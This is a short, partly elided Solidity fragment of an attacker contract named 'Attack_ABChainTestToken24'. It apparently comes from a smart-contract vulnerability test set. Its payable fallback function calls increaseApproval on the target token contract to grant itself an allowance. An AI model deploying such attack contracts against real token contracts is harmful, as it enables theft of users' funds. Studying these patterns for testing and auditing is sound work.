...
contract Attack_ABChainTestToken24 {

  ABChainTestToken2 public target_contract;

  function Attack_ABChainTestToken24(address _targetContract) public payable {
  ...
  function() public payable {
    target_contract.increaseApproval(this,  10000);
  }
} 
